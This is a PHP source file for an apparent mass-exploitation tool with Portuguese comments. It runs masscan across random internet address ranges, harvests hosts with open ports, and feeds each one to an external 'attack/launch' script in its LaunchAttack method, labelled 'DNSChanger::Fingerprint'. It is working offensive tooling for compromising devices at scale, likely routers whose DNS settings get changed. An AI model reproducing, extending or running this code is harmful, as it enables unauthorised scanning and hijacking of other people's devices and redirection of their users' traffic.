    <?php


    class RangedPortScanner
    {
        private $MasscanRunningList;
        public function __construct()
        {
            $this->MasscanRunningList = array();
        }

        public function isRunning()
        {
           # $Cmd	=	shell_exec("ps -aux | sort -u | grep 'masscan -p' | wc -l") - 2;
            #return ( $Cmd >= 1 ) ? true : false;
        }

        public function ScannersRunning()
        {
            $Cmd			=	shell_exec("ps -aux | sort -u | grep 'masscan -p'") ;
            $RunningCount 	= 0;
            foreach (explode("\n",$Cmd) as $Line )
            {
                if (strpos($Line,"--range") != false )
                {
                    $RunningCount++;
                }
            }
            return $RunningCount;
        }

        public function Launch($Range,$Ports,$Threads) //A Porta tem q ser passada por array
        {
            if ( is_array($Ports) ) 
			{
                $Ports = implode(",",$Ports);
                $Type = array();
				$Type[] = "{$Range}.250.0-{$Range}.250.255";
				$Type[] = "{$Range}.230.0-{$Range}.240.255";
				$Type[] = "{$Range}.220.0-{$Range}.230.255";
				$Type[] = "{$Range}.200.0-{$Range}.210.255";
				$Type[] = "{$Range}.199.0-{$Range}.200.255";
				$Type[] = "{$Range}.198.0-{$Range}.199.255";
				$Type[] = "{$Range}.196.0-{$Range}.198.255";
				$Type[] = "{$Range}.196.0-{$Range}.196.255";
				$Type[] = "{$Range}.176.0-{$Range}.186.255";
				$Type[] = "{$Range}.166.0-{$Range}.176.255";
				$Type[] = "{$Range}.146.0-{$Range}.166.255";
				$Type[] = "{$Range}.126.0-{$Range}.146.255";
				$Type[] = "{$Range}.96.0-{$Range}.126.255";
				$Type[] = "{$Range}.78.0-{$Range}.96.255";
				$Type[] = "{$Range}.63.0-{$Range}.78.255";
				$Type[] = "{$Range}.31.0-{$Range}.63.255";
				$Type[] = "{$Range}.0.0-{$Range}.31.255";
				$Teste = $Type[rand(0,count($Type) - 1 )];
                $Cmd = "masscan -p{$Ports} --range {$Teste} --rate=$Threads > '../application/logs/masscan/{$Range}.log' 2> /dev/null 3> /dev/null &";
                system($Cmd);
            }
        }

        public function CountLogs()
        {
            $FilesCount 	=	count(scandir("../application/logs/masscan/")) - 2 ;
            if ($FilesCount > 1 ) {
                $Result		=	shell_exec("cat ../application/logs/masscan/* | sort -u | wc -l");
            } else { $Result = 0; }
            return str_replace("\n","",$Result);
        }

        public function ParseFoundIpsToFile()
        {
            shell_exec("cat ../application/logs/masscan/* | sort -u > ../application/logs/parsed_ips/parsed.log");
            shell_exec("rm -r ../application/logs/masscan/*");
            $this->Kill();
        }

        public function Kill()
        {
            system("pkill -f 'masscan' > /dev/null");
            @unlink("paused.conf");
        }

        public function Memory()
        {
            system("pkill -f 'api.php'");
            system("pkill -f 'proxychains'");
            system("pkill -f 'curl'");
        }

        public function RandomChoice($RangeArray)
        {
          return $RangeArray[rand(0,count($RangeArray)-1)];
        }

        function CalcularPorcentagem($Numero, $Porcentagem)
        {
            return ( $Porcentagem * 100 ) / $Numero ;
        }

        function CurrentCpuUsage()
        {
            $Command        = shell_exec("free");
            $Data           = explode("\n",$Command);
            $Infos          = explode("     ",$Data[1]);
            $Total          = $Infos[1];
            $CpuUsage       = explode("   ",$Infos[2]);
            $Result         = array();
            if ( isset($CpuUsage) && !empty($CpuUsage[1])) {
                $Result["total"] = $Total;
                $Result["using"] = $CpuUsage[0];
                $Result["free"] = $CpuUsage[1];
                return $Result;
            } else { return false; }
        }

        public function LaunchAttack()
        {
            global $Utils;
            $this->Kill();
            $TargetList     = array();
            $teste 			= shell_exec("cat ../application/logs/masscan/* | sort -u");
            $data 			= explode("\n",$teste);
            $c 				= count($data);
            $Counter 		= 0;
            foreach ( $data as $k => $Line )
            {
                if ( strpos($Line,"Discovered open port") !== false )
                {
                    $Port =  str_replace(" ","",$Utils->GetStr($Line,'Discovered open port ','/tcp'));
                    $Host =  str_replace(" ","",$Utils->GetStr($Line."|",'on ',"|"));
                    $TargetList[] = $Host.":".$Port;
                }
            }
            shuffle($TargetList);
            foreach ( $TargetList as $Count => $Target)
            {
                $Counter++;
                if (  $Counter == 700  ) { usleep(82200);  $this->Memory(); $Counter = 0; }
    //            $CpuUsage   = $this->CurrentCpuUsage();
               // if ( isset($CpuUsage["free"]) && !empty($CpuUsage["free"]) && $CpuUsage["free"] <= 3500712 ) { $this->Memory(); }
                $Data =  "[ $Count ] DNSChanger::Fingerprint ( {$Target} )  \r\n";
                system("sh ../application/launchers/attack/launch {$Target} &");
                usleep(52200);
                echo $Data ;
            }
            system("rm -r ../application/logs/masscan/*");
	    //system("rm -r ../application/logs/found/*");
            $this->Memory();
        }

    }
